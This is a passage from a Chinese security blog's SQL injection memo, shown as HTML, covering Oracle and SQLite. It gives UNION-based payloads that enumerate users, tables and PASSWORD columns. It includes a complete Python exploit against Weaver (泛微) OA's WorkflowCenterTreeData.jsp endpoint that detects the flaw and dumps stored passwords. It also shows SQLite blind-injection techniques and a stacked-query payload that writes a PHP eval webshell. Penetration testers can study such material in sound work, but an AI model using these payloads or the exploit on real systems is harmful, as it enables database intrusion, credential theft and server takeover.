null,member from v$logfile where rownum=1 order by (((1</span><br><span class="line"></span><br><span class="line">服务器sid ( 远程连接的话需要， select instance_name from v$instance;）</span><br><span class="line">and 1=2 union select null,instance_name from v$instance order by (((1</span><br><span class="line"></span><br><span class="line">当前用户：SELECT user FROM dual;</span><br><span class="line">　　</span><br><span class="line">当前连接用户 （select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual）</span><br><span class="line">and 1=2 union select null,SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual order by (((1</span><br><span class="line"></span><br><span class="line">获取系统中所有用户</span><br><span class="line">and 1=2 union select null,username from all_users order by (((1</span><br><span class="line"></span><br><span class="line">获取系统中所有数据库名称</span><br><span class="line">and 1=2 union select distinct null,owner from all_tables order by (((1</span><br><span class="line"></span><br><span class="line">获取所有表(所有库)</span><br><span class="line">and 1=2 union select   null,table_name from all_tables order by (((1</span><br></pre></td></tr></table></figure>
+
+<h5 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5><p>复杂方式</p>
+<ul>
+<li>所有表</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select null,table_name from user_tables order by (((1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当前数据库中的第一个表：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(select table_name from user_tables where rownum=1)</span><br><span class="line"></span><br><span class="line">and 1=2 union select null,(select table_name from user_tables where rownum=1) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当前库的第二个表</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(select table_name from user_tables where rownum=1 and table_name not in (&apos;第一个表名&apos;))</span><br><span class="line"></span><br><span class="line">(select table_name from user_tables where rownum=1 and table_name &lt;&gt;&apos;第一个表名&apos;)</span><br><span class="line"></span><br><span class="line">and 1=2 union select null,(select table_name from user_tables where rownum=1 and table_name not in (&apos;ACTIONEXECUTELOG&apos;)) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当前库第三个表</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(select table_name from user_tables where rownum=1 and table_name not in (&apos;ACTIONEXECUTELOG&apos;,&apos;ACTIONSETTING&apos;))</span><br><span class="line"></span><br><span class="line">and 1=2 union select null,(select table_name from user_tables where rownum=1 and table_name not in (&apos;ACTIONEXECUTELOG&apos;,&apos;ACTIONSETTING&apos;)) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<p>。。。以此类推。。。</p>
+<p><strong>简单方式</strong></p>
+<ul>
+<li>这里利用user_tab_columns获取所有的表以及字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select null,table_name||chr(35)||column_name from user_tab_columns order by (((1</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,(select chr(126)||chr(39)||data||chr(39)||chr(126) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns) where limit =455) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<p>因为Oracle不像Mysql那样存在limit可以一条一条的查询，Oracle想要实现必须自己构造一种方法。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Oracle 没有limit 这样的语句所以可以用where rownum=1 来返回第一条数据。但是如果想知道其他某一条记录怎么办呢？直接rownum=2 是不行的，这里可以再次嵌套一个子查询语句如下：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 也就是将rownum当作limit,table_nameh和column_name用字符～连接起来看作data,这时候即可构造：select data from ( slect rownum as limit,table_name||chr(35)||column_name as data from user_tab_colunms where column like 'PASSWORD')</span></span><br><span class="line"></span><br><span class="line">再加入主语句加入where，返回第几条数据：<span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> ( slect <span class="keyword">rownum</span> <span class="keyword">as</span> <span class="keyword">limit</span>,table_name||column_name <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">from</span> user_tab_colunms <span class="keyword">where</span> <span class="keyword">column</span> <span class="keyword">like</span> <span class="string">'PASSWORD'</span>) <span class="keyword">where</span> <span class="keyword">limit</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终形成了语句</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">chr</span>(<span class="number">126</span>)||<span class="keyword">chr</span>(<span class="number">39</span>)||<span class="keyword">data</span>||<span class="keyword">chr</span>(<span class="number">39</span>)||<span class="keyword">chr</span>(<span class="number">126</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> <span class="keyword">as</span> <span class="keyword">limit</span>,table_name||<span class="keyword">chr</span>(<span class="number">35</span>)||column_name <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> column_name <span class="keyword">like</span> <span class="string">'PASSWORD'</span>) <span class="keyword">where</span> <span class="keyword">limit</span> =<span class="number">2</span>)  <span class="keyword">from</span> dual <span class="keyword">order</span> <span class="keyword">by</span> (((<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h5><p><strong>复杂方式</strong></p>
+<p>获取所有字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select null,column_name from user_tab_columns order by (((1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>指定表，第一个字段</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;ACTIONSETTING&apos;) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>指定表，第二个字段</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;ACTIONSETTING&apos; and column_name not in (&apos;ID&apos;)) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>指定表，第三个字段</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;ACTIONSETTING&apos; and column_name not in (&apos;ID&apos;,&apos;ACTIONNAME&apos;)) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<p>。。。以此类推。。。</p>
+<p><strong>简单方式</strong></p>
+<p>构造以使用类似于MYSQL中limit，来查询指定表名中的字段名称。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,(select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(65)||CHR(80)||CHR(80)||CHR(85)||CHR(83)||CHR(69)||CHR(73)||CHR(78)||CHR(70)||CHR(79)) whEre limit =1) from dual order by (((1</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,(select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=&apos;USER_INFO&apos;) whEre limit =1) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<h5 id="查询指定表中字段内容"><a href="#查询指定表中字段内容" class="headerlink" title="查询指定表中字段内容"></a>查询指定表中字段内容</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,(Select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,PASSWORD||chr(35)||ID as data from USER_INFO) where limit=5) from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<h4 id="泛微OA-EXP编写"><a href="#泛微OA-EXP编写" class="headerlink" title="泛微OA EXP编写"></a>泛微OA EXP编写</h4><p>(为了简洁的找到username或password，或者脱裤子。)</p>
+<ul>
+<li>第一步：获取含有<code>PASSWORD</code>字符的表名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">chr</span>(<span class="number">126</span>)||<span class="keyword">chr</span>(<span class="number">39</span>)||<span class="keyword">data</span>||<span class="keyword">chr</span>(<span class="number">39</span>)||<span class="keyword">chr</span>(<span class="number">126</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> <span class="keyword">as</span> <span class="keyword">limit</span>,table_name||<span class="keyword">chr</span>(<span class="number">35</span>)||column_name <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> column_name <span class="keyword">like</span> <span class="string">'PASSWORD'</span>) <span class="keyword">where</span> <span class="keyword">limit</span> =<span class="number">2</span>)  <span class="keyword">from</span> dual <span class="keyword">order</span> <span class="keyword">by</span> (((<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二步：获取含有PASSWORD字段表的全部字段</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">chr</span>(<span class="number">126</span>)||<span class="keyword">chr</span>(<span class="number">39</span>)||<span class="keyword">data</span>||<span class="keyword">chr</span>(<span class="number">39</span>)||<span class="keyword">chr</span>(<span class="number">126</span>) <span class="keyword">from</span> (<span class="keyword">selEct</span> <span class="keyword">rownum</span> <span class="keyword">as</span> <span class="keyword">limit</span>,column_name <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">whEre</span> table_name=<span class="string">'USER_TABLE'</span>) <span class="keyword">whEre</span> <span class="keyword">limit</span> =<span class="number">1</span>)  <span class="keyword">from</span> dual <span class="keyword">order</span> <span class="keyword">by</span> (((<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取前10条数据</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">Select</span> <span class="keyword">chr</span>(<span class="number">126</span>)||<span class="keyword">chr</span>(<span class="number">39</span>)||<span class="keyword">data</span>||<span class="keyword">chr</span>(<span class="number">39</span>)||<span class="keyword">chr</span>(<span class="number">126</span>) <span class="keyword">from</span> (<span class="keyword">selEct</span> <span class="keyword">rownum</span> <span class="keyword">as</span> <span class="keyword">limit</span>,<span class="keyword">PASSWORD</span>||<span class="keyword">chr</span>(<span class="number">35</span>)||<span class="keyword">ID</span> <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">from</span> HRMRESOURCE) <span class="keyword">where</span> <span class="keyword">limit</span>=<span class="number">5</span>)  <span class="keyword">from</span> dual <span class="keyword">order</span> <span class="keyword">by</span> (((<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>POC及EXP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for Exp"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        super(Exp, self).__init__()</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers=&#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.path = <span class="string">"/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333"</span></span><br><span class="line">        self.tables = []</span><br><span class="line">        self.passwords = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">        post_data = <span class="string">"formids=11111111111)))"</span> + <span class="string">"%0a%0d"</span>*<span class="number">360</span>+<span class="string">"union select NULL,value from v$parameter order by (((1"</span></span><br><span class="line">        req = requests.post(self.url+self.path,data=post_data,headers=self.headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'%ORACLE_HOME%'</span> <span class="keyword">and</span> <span class="string">'DBHOME'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            print(<span class="string">'[+] 该泛微-协同办公OA存在SQL注入'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] NOT Found~'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_tables</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'[--------------开始查找带有 PASSWORD 字段的表-----------]'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">            post_data = <span class="string">"formids=11111111111)))"</span> + <span class="string">"%0a%0d"</span>*<span class="number">360</span>+<span class="string">"and 1=2 union select 1,(select chr(126)||chr(39)||data||chr(39)||chr(126) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns where column_name like 'PASSWORD') where limit =&#123;0&#125;)  from dual order by (((1"</span>.format(i)</span><br><span class="line">            table_response = requests.post(self.url+self.path,headers=self.headers, data=post_data)</span><br><span class="line">            tables = re.findall(<span class="string">'~\'(.*?)#PASSWORD\'~'</span>, table_response.text, re.S)</span><br><span class="line">            <span class="keyword">if</span> tables:</span><br><span class="line">                <span class="keyword">if</span> tables[<span class="number">0</span>]:</span><br><span class="line">                    self.tables.append(tables[<span class="number">0</span>])</span><br><span class="line">                    print(<span class="string">'[+] 找到带有 PASSWORD 字段的表 --&gt;  '</span>+tables[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print(self.tables)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_password</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'\n[+++++++++++++ 开始查找密码  +++++++++++++]\n'</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.tables:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                post_data = <span class="string">"formids=11111111111)))"</span>+<span class="string">"%0a%0d"</span>*<span class="number">360</span>+<span class="string">"and 1=2 union select 1,(Select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,PASSWORD as data from &#123;0&#125;) where limit=&#123;1&#125;)  from dual order by (((1"</span>.format(x,i)</span><br><span class="line">                passwords_response = requests.post(self.url+self.path,headers=self.headers, data=post_data)</span><br><span class="line">                passwords = re.findall(<span class="string">'~\'(.*?)\'~'</span>, passwords_response.text, re.S)</span><br><span class="line">                <span class="keyword">if</span> passwords:</span><br><span class="line">                    <span class="keyword">if</span> passwords[<span class="number">0</span>]:</span><br><span class="line">                        s = <span class="string">'表：'</span>+x+<span class="string">'  密码:'</span>+passwords[<span class="number">0</span>]</span><br><span class="line">                        print(<span class="string">'[+] 找到密码 --&gt;  '</span>+s)</span><br><span class="line">                        </span><br><span class="line">                        self.passwords.append(s)</span><br><span class="line">                    <span class="keyword">else</span>:print(<span class="string">'[-] 密码为空'</span>)</span><br><span class="line">        print(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="comment"># print(self.passwords)</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        argv = sys.argv[<span class="number">1</span>:<span class="number">2</span>]</span><br><span class="line">        exp = Exp(argv[<span class="number">0</span>])</span><br><span class="line">        poc = exp.poc()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="string">'python3 fw-oa-exp.py http://www.example.com:8081'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> poc <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'[========开始查找，默认20个表，每个表5条记录========]'</span>)</span><br><span class="line">        exp.get_tables()</span><br><span class="line">        exp.get_password()</span><br><span class="line">        print(<span class="string">'[========查找完毕，默认20个表，每个表5条记录========]'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Sqlite"><a href="#Sqlite" class="headerlink" title="Sqlite"></a>Sqlite</h1><p>docker 安装：<a href="https://hub.docker.com/r/nouchka/sqlite3/" target="_blank" rel="noopener">https://hub.docker.com/r/nouchka/sqlite3/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it nouchka/sqlite3d</span><br><span class="line">ocker-compose run sqlite3</span><br></pre></td></tr></table></figure>
+
+<h2 id="常用信息及语句"><a href="#常用信息及语句" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><p>数据库版本：<br><code>select sqlite_version()</code></p>
+<p>获取所有表名：<br><code>SELECT name FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
+<p>所有表结构(包含字段名，表名)：<br><code>SELECT sql FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
+<p>注释符：<br><code>--</code></p>
+<p>盲注常用函数：<code>substr()（没有mid、left等函数），判断长度函数length()</code></p>
+<h2 id="BOOL盲注"><a href="#BOOL盲注" class="headerlink" title="BOOL盲注"></a>BOOL盲注</h2><p>bool条件构造和MySQL一样，但是亦或运算的Payload不可用，注释符使用–。</p>
+<p>逻辑判断目前我就翻到一个substr()，应用实例：<br><code>cond=&#39;FALSE&#39; or (substr(&#39;abc&#39;,1,1)=&#39;a&#39;)</code></p>
+<h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>sqlite没有类似sleep()的函数，但有个函数randomblob(N)，生成N个任意字符，可以造成延时。</p>
+<p>SQLite没有if，可以使用case when … then …</p>
+<p>格式<code>cond=&#39;true&#39; AND 1=(case when (bool) then randomblob(100000000) else 0 end)</code><br>100000000个字符就有明显延时了。</p>
+<p>注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次<code>randomblob(100000000)</code>，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以 <code>id=&#39;&#39; or 1 AND 1=randomblob(1000000)</code>这样，把N的值缩小100倍。灵活运用。</p>
+<p>运用实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1 and 1=(case when substr(&apos;abc&apos;,1,1)=&apos;a&apos; then randomblob(1000000) else 0 end)--</span><br></pre></td></tr></table></figure>
+
+<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>需要直接访问数据库，或堆叠查询选项启用（默认关闭）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;ATTACH DATABASE &apos;/tmp/p0.php&apos; AS p0;CREATE TABLE p0.shell (data text);INSERT INTO p0.shell (data) VALUES (&apos;&lt;?php eval($_POST[1]);?&gt;&apos;);--</span><br></pre></td></tr></table></figure>
+
+<p>root权限的话可以写计划任务和公钥，参考redis未授权访问利用。</p>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>只能用在Windows上，需要特殊配置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_extension(library_file,entry_point)</span><br></pre></td></tr></table></figure>
+
+<h2 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h2><p><a href="https://www.anquanke.com/post/id/85552" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85552</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/10/15/sql备忘录/" title="sql备忘录">https://wh0ale.github.io/2019/10/15/sql备忘录/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/sql/" rel="tag"><i class="fa fa-tag"></i># sql</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/10/14/openvpn-udp-反射放大DDoS攻击实验/" rel="next" title="openvpn udp 反射放大DDoS攻击实验">
+                <i class="fa fa-chevron-left"></i> openvpn udp 反射放大DDoS攻击实验
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/10/20/恶意样本流量分析/" rel="prev" title="恶意样本流量分析">
+                恶意样本流量分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
